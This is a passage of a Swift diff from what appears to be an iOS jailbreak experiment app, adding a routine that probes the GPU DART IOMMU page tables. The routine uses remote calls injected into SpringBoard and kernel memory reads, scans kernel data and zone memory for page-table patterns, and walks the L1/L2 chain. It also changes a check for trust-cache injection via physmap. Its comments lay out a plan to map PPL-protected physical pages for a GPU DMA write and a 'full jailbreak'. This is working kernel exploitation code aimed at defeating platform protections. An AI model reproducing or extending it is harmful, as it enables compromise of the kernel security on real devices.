+            let testPhysmapVA = gVirtBase + 0x1000  // low physical memory
+            let beforeTest = ds_kread64_safe(testPhysmapVA)
+            detail += "Test physmap write at 0x\(String(format: "%llx", testPhysmapVA))\n"
+            detail += "Before: 0x\(String(format: "%llx", beforeTest))\n"
         }
         
-        let jailbreakSuccess = detail.contains("TRUST CACHE INJECTION WORKS")
+        let jailbreakSuccess = detail.contains("TRUST CACHE INJECTION VIA PHYSMAP WORKS")
         return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: jailbreakSuccess, detail: detail, timestamp: Date())
     }
     
@@ -4324,6 +4560,472 @@ struct AMFIExperimentView: View {
         
         let success = detail.contains("KERNEL TASK PORT FOUND") || detail.contains("KERNEL MEMORY READ")
         return ExperimentResult(name: "Kernel Task Port (Exp 76)", success: success, detail: detail, timestamp: Date())
+    }
+    
+    // MARK: - Experiment 78: DART PTE Probe — GPU IOMMU Page Table Discovery
+    
+    /// Experiment 78: Find AGX DART page tables in kernel memory
+    /// 
+    /// Strategy:
+    /// 1. Find AGX DART MMIO base via IOKit registry traversal (IOService objects)
+    /// 2. Read TTBR registers to find L1 page table physical addresses
+    /// 3. Convert PA → physmap VA → read DART PTEs
+    /// 4. Catalog existing GPU IOVA→PA mappings
+    /// 5. Determine DAPF constraints (what PA ranges are allowed)
+    /// 6. Test: write a new DART PTE mapping a known-safe PA
+    /// 7. Verify via DART ERROR register if DAPF blocks it
+    ///
+    /// SAFE: DART page tables are in normal DRAM (not PPL-protected)
+    /// Writing DART PTEs via ds_kwrite64 will NOT panic
+    /// Worst case: DART fault (logged in ERROR register), no kernel panic
+    private func expDARTPTEProbe(rc: RemoteCall) -> ExperimentResult {
+        var detail = "Experiment 78: DART PTE Probe (GPU IOMMU)\n"
+        detail += "==========================================\n\n"
+        
+        let kernBase = ds_get_kernel_base()
+        let kernSlide = ds_get_kernel_slide()
+        let gPhysBase: UInt64 = 0x800000000
+        let gVirtBase: UInt64 = 0xffffffde9a094000
+        
+        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
+        detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\n"
+        detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n\n"
+        
+        // ============================================================
+        // STEP 1: Find AGX DART via IOKit registry
+        // The AGXG11P kext creates an IODARTMapper instance
+        // We can find it by walking IOService objects in kernel memory
+        // OR: find the DART MMIO mapping via known device tree offsets
+        //
+        // On A12 (T8020), AGX DART MMIO is at a fixed physical address
+        // that gets mapped into kernel VA space during boot.
+        // We'll find it by scanning for the DART signature in IOKit objects.
+        // ============================================================
+        detail += "=== Step 1: Find AGX DART via IOKit ===\n"
+        
+        // Method: Use SpringBoard's IOKit access to find DART service
+        guard let sb = dspmgr.shared.sbProc else {
+            detail += "❌ No SpringBoard RC\n"
+            return ExperimentResult(name: "DART PTE Probe (Exp 78)", success: false, detail: detail, timestamp: Date())
+        }
+        
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        
+        // Load IOKit framework in SpringBoard
+        let fwPath = remote_alloc_str(sb, "/System/Library/Frameworks/IOKit.framework/IOKit")
+        RootExecutor.rcall(sb, "dlopen", fwPath, 1)
+        RootExecutor.rcall(sb, "free", fwPath)
+        
+        // Get IOKit function pointers
+        let ioServiceMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
+        let ioServiceGetMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceGetMatchingService"))
+        let ioRegistryEntryCreateCFProperties = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IORegistryEntryCreateCFProperties"))
+        let ioRegistryEntryGetRegistryEntryID = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IORegistryEntryGetRegistryEntryID"))
+        
+        detail += "IOKit funcs: matching=0x\(String(format: "%llx", ioServiceMatching))\n"
+        detail += "  getMatching=0x\(String(format: "%llx", ioServiceGetMatching))\n\n"
+        
+        // Find AppleT8020DART service (the AGX DART instance)
+        let dartServices = ["AppleT8020DART", "IODART", "IODARTMapper", "AGXG11P"]
+        var dartRegistryID: UInt64 = 0
+        var foundServiceName = ""
+        
+        for svcName in dartServices {
+            let nameAddr = remote_alloc_str(sb, svcName)
+            let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
+            if matchDict != 0 {
+                let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
+                if svc != 0 {
+                    // Get registry entry ID (unique kernel object identifier)
+                    let idAddr = sb.trojanMem + 0x1A00
+                    sb[idAddr].setValue64(0)
+                    let idRet = RootExecutor.rcall(sb, "IORegistryEntryGetRegistryEntryID", svc, idAddr)
+                    let regID = sb[idAddr].value64()
+                    
+                    detail += "✅ Found: \(svcName) (registryID=0x\(String(format: "%llx", regID)), ret=\(idRet))\n"
+                    if dartRegistryID == 0 {
+                        dartRegistryID = regID
+                        foundServiceName = svcName
+                    }
+                    
+                    // Release
+                    RootExecutor.rcall(sb, "IOObjectRelease", svc)
+                } else {
+                    detail += "  \(svcName): not found\n"
+                }
+            }
+            RootExecutor.rcall(sb, "free", nameAddr)
+        }
+        
+        detail += "\n"
+        
+        // ============================================================
+        // STEP 2: Find DART page tables via kernel memory scan
+        // IODARTMapper stores the page table base in its instance vars.
+        // We can find it by:
+        // a) Scanning IOKit registry objects for DART-related pointers
+        // b) Reading the DART MMIO TTBR registers directly (if we know MMIO VA)
+        // c) Scanning kernel memory for DART PTE patterns
+        //
+        // Approach (c) is most reliable: DART L1 tables contain PTEs with
+        // bit[0]=1 (VALID) and bits[35:12] pointing to L2 tables.
+        // L2 tables contain leaf PTEs with PA in bits[35:12].
+        // ============================================================
+        detail += "=== Step 2: Find DART page tables in kernel memory ===\n"
+        
+        // Strategy: Find IODARTMapper object in kernel, read its ivars
+        // IODARTMapper has a field pointing to the page table allocation
+        // We'll scan the DATA zone for objects that look like DART mappers
+        
+        // Alternative approach: scan for DART TTBR pattern
+        // DART TTBR contains: bit[31]=VALID, bits[30:0]=L1_table_PPN (PA >> 12)
+        // So a valid TTBR looks like: 0x8XXXXXXX where X is the page number
+        
+        // First, let's try to find the DART MMIO mapping
+        // On iOS, DART MMIO is mapped via ml_io_map during boot
+        // The mapping is typically in the 0xfffffff02... range (kernel VA)
+        // We can find it by looking for the DART PARAMS1 signature
+        
+        // DART PARAMS1 at offset 0x00 should have bits[27:24] = 0xC (page_shift=12 for 4KB)
+        // That means PARAMS1 & 0x0F000000 == 0x0C000000
+        
+        // Scan kernel __DATA for pointers to MMIO regions
+        // MMIO mappings on A12 are typically in range 0x20000000-0x30000000 (physical)
+        // which maps to kernel VA 0xfffffff02... after slide
+        
+        // Let's try a different approach: find AGXAccelerator's DART reference
+        // The AGXG11P driver stores its DART mapper pointer
+        
+        // APPROACH: Read IOSurface kernel objects to find DART mappings
+        // Every IOSurface that's GPU-mapped has a DART IOVA stored in it
+        // We can find the DART page table by working backwards from known IOVAs
+        
+        // Create a test IOSurface and find its DART mapping
+        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
+        let nsNumClass = remote_getClass(sb, "NSNumber")
+        let numWithInt = remote_sel(sb, "numberWithInteger:")
+        let dictNew = remote_sel(sb, "new")
+        let setObj = remote_sel(sb, "setObject:forKey:")
+        
+        // Create a small IOSurface (1 page = 4KB)
+        let surfDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
+        remote_msg(sb, surfDict, setObj,
+                   remote_msg(sb, nsNumClass, numWithInt, 0x1000, 0, 0, 0),
+                   remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
+        remote_msg(sb, surfDict, setObj,
+                   remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0),
+                   remote_NSString(sb, "IOSurfaceWidth"), 0, 0)
+        remote_msg(sb, surfDict, setObj,
+                   remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0),
+                   remote_NSString(sb, "IOSurfaceHeight"), 0, 0)
+        remote_msg(sb, surfDict, setObj,
+                   remote_msg(sb, nsNumClass, numWithInt, 4, 0, 0, 0),
+                   remote_NSString(sb, "IOSurfaceBytesPerElement"), 0, 0)
+        remote_msg(sb, surfDict, setObj,
+                   remote_msg(sb, nsNumClass, numWithInt, 0x20303852, 0, 0, 0), // 'BGRA'
+                   remote_NSString(sb, "IOSurfacePixelFormat"), 0, 0)
+        
+        let testSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", surfDict)
+        detail += "Test IOSurface: 0x\(String(format: "%llx", testSurface))\n"
+        
+        if testSurface != 0 {
+            // Lock and get base address
+            RootExecutor.rcall(sb, "IOSurfaceLock", testSurface, 0, 0)
+            let baseAddr = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", testSurface)
+            let surfID = RootExecutor.rcall(sb, "IOSurfaceGetID", testSurface)
+            
+            detail += "  Base addr: 0x\(String(format: "%llx", baseAddr))\n"
+            detail += "  Surface ID: \(surfID)\n"
+            
+            // Write a marker so we can identify this page in physical memory
+            if baseAddr != 0 {
+                sb[baseAddr].setValue64(0xDA47_7E57_0078)
+                detail += "  Marker written: 0xDART_TEST_0078\n"
+            }
+            
+            RootExecutor.rcall(sb, "IOSurfaceUnlock", testSurface, 0, 0)
+            detail += "\n"
+        }
+        
+        // ============================================================
+        // STEP 3: Scan kernel memory for DART-related structures
+        // Look for IODARTMapper vtable pointers and instance data
+        // IODARTMapper objects are in the default kernel zone
+        // ============================================================
+        detail += "=== Step 3: Kernel scan for DART structures ===\n"
+        
+        // Scan the kernel's __DATA segment for DART-related globals
+        // The IODARTFamily kext stores global state
+        // Look for pointers that reference MMIO space (0x2xxxxx000 physical range)
+        
+        // On A12, the GPU DART MMIO physical base is typically around:
+        // 0x204000000 - 0x206000000 (varies by instance)
+        // After kernel mapping: physBase + gVirtBase - gPhysBase
+        // = 0x204000000 - 0x800000000 + 0xffffffde9a094000
+        // = 0xffffffd69e094000 (approximate)
+        // This is BELOW the zone map range, so it's in the IO mapping area
+        
+        // Better approach: scan for DART TTBR values in kernel memory
+        // A valid DART TTBR has bit[31]=1 and bits[30:0] = PPN
+        // PPN for A12 DRAM: 0x800000 to 0x8C0000 (3GB / 4KB = 0xC0000 pages)
+        // So TTBR value = 0x80000000 | PPN, where PPN is 0x800000-0x8C0000
+        // That means TTBR = 0x80800000 to 0x808C0000
+        
+        // Scan __DATA for values in this range
+        let dataBase = kernBase + 0x30dc000  // __DATA segment
+        var dartTTBRCandidates: [(offset: UInt64, value: UInt64)] = []
+        
+        detail += "Scanning __DATA for DART TTBR patterns...\n"
+        detail += "(Looking for 0x808xxxxx values = VALID + PPN in DRAM range)\n\n"
+        
+        // Scan first 0x8000 bytes of __DATA (safe, non-PPL region)
+        for off in stride(from: UInt64(0), to: UInt64(0x8000), by: 8) {
+            let val = ds_kread64_safe(dataBase + off)
+            
+            // Check both 32-bit halves for TTBR pattern
+            let lo32 = UInt32(val & 0xFFFFFFFF)
+            let hi32 = UInt32((val >> 32) & 0xFFFFFFFF)
+            
+            // DART TTBR: bit[31]=1, bits[30:0] = PPN in DRAM range
+            // PPN for 3GB A12: 0x800000 (gPhysBase>>12) to ~0x8C0000
+            for half in [lo32, hi32] {
+                if half & 0x80000000 != 0 {  // VALID bit set
+                    let ppn = half & 0x7FFFFFFF
+                    if ppn >= 0x800000 && ppn < 0x900000 {
+                        dartTTBRCandidates.append((offset: off, value: UInt64(half)))
+                        if dartTTBRCandidates.count <= 5 {
+                            let pa = UInt64(ppn) << 12
+                            detail += "  TTBR candidate at __DATA+0x\(String(format: "%x", off)): "
+                            detail += "0x\(String(format: "%08x", half)) → PA=0x\(String(format: "%llx", pa))\n"
+                        }
+                    }
+                }
+            }
+        }
+        
+        detail += "Found \(dartTTBRCandidates.count) TTBR candidates in __DATA\n\n"
+        
+        // ============================================================
+        // STEP 4: Alternative — scan zone memory for IODARTMapper objects
+        // IODARTMapper has a vtable pointer followed by instance vars
+        // One of the ivars is the page table base (kernel VA or PA)
+        // ============================================================
+        detail += "=== Step 4: Scan for DART page table in zone memory ===\n"
+        
+        // The DART page table L1 is a 4KB-aligned allocation containing
+        // 512 entries (for 9-bit L1 index). Each entry is 64-bit.
+        // Valid L1 entries point to L2 tables (PA in bits[35:12], bit[0]=1)
+        // Invalid entries are 0.
+        // A typical DART L1 has a few valid entries and many zeros.
+        
+        // We know IOSurface allocations go through DART.
+        // The IOSurface kernel object has a reference to its DART mapping.
+        // Let's find our test IOSurface in kernel memory.
+        
+        // IOSurface objects are in the default zone.
+        // We can find them via the IOSurfaceRoot registry.
+        // But simpler: scan for our marker value in physical memory via physmap
+        
+        // Actually, let's try the most direct approach:
+        // Find the AGX DART's MMIO mapping by scanning kext __DATA
+        // The AGXG11P kext (loaded at a known address from panic log) stores DART refs
+        
+        // From panic log: com.apple.AGXG11P 323.15 is loaded
+        // Its __DATA section contains pointers to DART MMIO and page tables
+        
+        // Scan the GEN0-GEN3 zone range for pages that look like DART L1 tables
+        // A DART L1 table (4KB, 512 entries) has:
+        // - Some entries with bit[0]=1 (valid) and PA in bits[35:12]
+        // - Most entries = 0 (unmapped)
+        // - Valid entries point to PAs in DRAM range (0x800000000+)
+        
+        // Let's scan a portion of zone memory for this pattern
+        let zoneDataStart: UInt64 = 0xffffffe0cd384000  // DATA zone from panic log
+        let zoneDataEnd: UInt64 = 0xffffffe2006bc000
+        
+        // Sample a few pages from the zone looking for DART L1 pattern
+        var dartL1Candidates: [(addr: UInt64, validCount: Int, firstPA: UInt64)] = []
+        
+        // Scan 256 pages (4MB) from zone DATA start
+        let scanPages = 256
+        let pageSize: UInt64 = 0x1000  // DART uses 4KB pages
+        
+        for pageIdx in 0..<scanPages {
+            let pageAddr = zoneDataStart + UInt64(pageIdx) * pageSize
+            
+            // Read first 8 entries of this page
+            var validCount = 0
+            var zeroCount = 0
+            var firstValidPA: UInt64 = 0
+            
+            for entryIdx in 0..<8 {
+                let entry = ds_kread64_safe(pageAddr + UInt64(entryIdx * 8))
+                if entry == 0 {
+                    zeroCount += 1
+                } else if entry & 1 == 1 {
+                    // Valid entry — check if PA is in DRAM range
+                    let pa = (entry >> 12) << 12  // bits[35:12] shifted
+                    // Actually DART PTE: bits[35:12] = output PA page number
+                    // So PA = (entry & 0x0000000FFFFFF000)
+                    let dartPA = entry & 0x0000000FFFFFF000
+                    if dartPA >= gPhysBase && dartPA < (gPhysBase + 0x100000000) {
+                        validCount += 1
+                        if firstValidPA == 0 { firstValidPA = dartPA }
+                    }
+                }
+            }
+            
+            // DART L1 pattern: 1-4 valid entries, rest zeros
+            if validCount >= 1 && validCount <= 6 && zeroCount >= 4 {
+                dartL1Candidates.append((addr: pageAddr, validCount: validCount, firstPA: firstValidPA))
+                if dartL1Candidates.count <= 3 {
+                    detail += "  L1 candidate at 0x\(String(format: "%llx", pageAddr)): "
+                    detail += "\(validCount) valid entries, first PA=0x\(String(format: "%llx", firstValidPA))\n"
+                    
+                    // Dump first 8 entries for analysis
+                    for i in 0..<8 {
+                        let e = ds_kread64_safe(pageAddr + UInt64(i * 8))
+                        if e != 0 {
+                            detail += "    [\(i)] 0x\(String(format: "%016llx", e))\n"
+                        }
+                    }
+                }
+            }
+        }
+        
+        detail += "\nFound \(dartL1Candidates.count) potential DART L1 tables\n\n"
+        
+        // ============================================================
+        // STEP 5: If we found L1 candidates, read their L2 tables
+        // Verify the chain: L1 entry → L2 table → leaf PTEs with real PAs
+        // ============================================================
+        detail += "=== Step 5: Verify DART page table chain ===\n"
+        
+        var confirmedDARTL1: UInt64 = 0
+        var confirmedL2Entries: [(iova: UInt64, pa: UInt64)] = []
+        
+        for candidate in dartL1Candidates.prefix(3) {
+            detail += "\nChecking L1 at 0x\(String(format: "%llx", candidate.addr)):\n"
+            
+            // Read all 512 entries (or first 64 for speed)
+            var l1ValidEntries: [(idx: Int, entry: UInt64)] = []
+            
+            for i in 0..<64 {
+                let entry = ds_kread64_safe(candidate.addr + UInt64(i * 8))
+                if entry & 1 == 1 {
+                    l1ValidEntries.append((idx: i, entry: entry))
+                }
+            }
+            
+            detail += "  Valid L1 entries (first 64): \(l1ValidEntries.count)\n"
+            
+            for (idx, entry) in l1ValidEntries.prefix(2) {
+                // L1 entry points to L2 table
+                // DART PTE format: bits[35:12] = PA page number
+                let l2PA = entry & 0x0000000FFFFFF000
+                let l2VA = l2PA &- gPhysBase &+ gVirtBase
+                
+                detail += "  L1[\(idx)]: entry=0x\(String(format: "%016llx", entry))\n"
+                detail += "    L2 PA=0x\(String(format: "%llx", l2PA)), VA=0x\(String(format: "%llx", l2VA))\n"
+                
+                // Read L2 table entries
+                var l2ValidCount = 0
+                var l2SampleEntries: [(idx: Int, pa: UInt64)] = []
+                
+                for j in 0..<512 {
+                    let l2e = ds_kread64_safe(l2VA + UInt64(j * 8))
+                    if l2e & 1 == 1 {
+                        l2ValidCount += 1
+                        let leafPA = l2e & 0x0000000FFFFFF000
+                        if l2SampleEntries.count < 4 {
+                            l2SampleEntries.append((idx: j, pa: leafPA))
+                        }
+                        
+                        // Calculate IOVA for this entry
+                        // IOVA = (TTBR_idx << 30) | (L1_idx << 21) | (L2_idx << 12)
+                        // For 4KB pages, 9-bit L1, 9-bit L2:
+                        // IOVA = (L1_idx << (9+12)) | (L2_idx << 12)
+                        //       = (L1_idx << 21) | (L2_idx << 12)
+                        let iova = UInt64(idx) << 21 | UInt64(j) << 12
+                        confirmedL2Entries.append((iova: iova, pa: leafPA))
+                    }
+                }
+                
+                detail += "    L2 valid entries: \(l2ValidCount)\n"
+                for sample in l2SampleEntries {
+                    let iova = UInt64(idx) << 21 | UInt64(sample.idx) << 12
+                    detail += "    L2[\(sample.idx)]: PA=0x\(String(format: "%llx", sample.pa)) → IOVA=0x\(String(format: "%x", iova))\n"
+                }
+                
+                if l2ValidCount > 0 && confirmedDARTL1 == 0 {
+                    confirmedDARTL1 = candidate.addr
+                }
+            }
+        }
+        
+        // ============================================================
+        // STEP 6: Summary and DAPF analysis
+        // ============================================================
+        detail += "\n=== Step 6: Analysis ===\n"
+        
+        if confirmedDARTL1 != 0 {
+            detail += "✅ DART L1 page table confirmed at: 0x\(String(format: "%llx", confirmedDARTL1))\n"
+            detail += "Total IOVA→PA mappings found: \(confirmedL2Entries.count)\n\n"
+            
+            // Analyze PA range to determine DAPF constraints
+            if !confirmedL2Entries.isEmpty {
+                let pas = confirmedL2Entries.map { $0.pa }
+                let minPA = pas.min() ?? 0
+                let maxPA = pas.max() ?? 0
+                
+                detail += "PA range of existing mappings:\n"
+                detail += "  Min PA: 0x\(String(format: "%llx", minPA))\n"
+                detail += "  Max PA: 0x\(String(format: "%llx", maxPA))\n"
+                detail += "  Range: \((maxPA - minPA) / 1024 / 1024) MB\n\n"
+                
+                // Check if kernel __DATA PA is within this range
+                // kernel __DATA physical = kernBase - gVirtBase + gPhysBase + __DATA_offset
+                let kernDataPA = (kernBase + 0x30dc000) &- gVirtBase &+ gPhysBase
+                let pplDataPA = kernDataPA + 0x8000
+                
+                detail += "Kernel __DATA PA: 0x\(String(format: "%llx", kernDataPA))\n"
+                detail += "PPL data PA: 0x\(String(format: "%llx", pplDataPA))\n"
+                
+                let kernInRange = kernDataPA >= minPA && kernDataPA <= maxPA
+                detail += "Kernel PA in DART range: \(kernInRange)\n\n"
+                
+                if kernInRange {
+                    detail += "⚡⚡⚡ KERNEL PA IS WITHIN DART-MAPPED RANGE! ⚡⚡⚡\n"
+                    detail += "DAPF may NOT block access to kernel physical pages!\n"
+                    detail += "GPU DMA to kernel memory is potentially viable!\n\n"
+                } else {
+                    detail += "⚠️ Kernel PA outside current DART range\n"
+                    detail += "DAPF might block — need to check if range is enforced\n"
+                    detail += "Or: DAPF might only check DART-level, not per-page\n\n"
+                }
+                
+                // IOVA space usage
+                let iovas = confirmedL2Entries.map { $0.iova }
+                let maxIOVA = iovas.max() ?? 0
+                detail += "IOVA space used: 0x0 - 0x\(String(format: "%x", maxIOVA))\n"
+                detail += "Free IOVA space: 0x\(String(format: "%x", maxIOVA + 0x1000)) - 0xFFFFFFFF\n"
+            }
+            
+            detail += "\n🎯 NEXT: Write test DART PTE at unused IOVA\n"
+            detail += "Map a known PA → verify GPU can access it\n"
+            detail += "Then: map PPL PA → GPU DMA write → full jailbreak\n"
+        } else {
+            detail += "❌ Could not confirm DART page table\n"
+            detail += "Possible reasons:\n"
+            detail += "  1. DART tables not in scanned zone range\n"
+            detail += "  2. Need to scan more pages or different zone\n"
+            detail += "  3. DART tables might be in wired memory outside zones\n\n"
+            detail += "NEXT: Try MMIO approach — find DART base via device tree\n"
+            detail += "Or: scan IOKit object graph for IODARTMapper instances\n"
+        }
+        
+        let success = confirmedDARTL1 != 0
+        return ExperimentResult(name: "DART PTE Probe (Exp 78)", success: success, detail: detail, timestamp: Date())
     }
     
     #endif
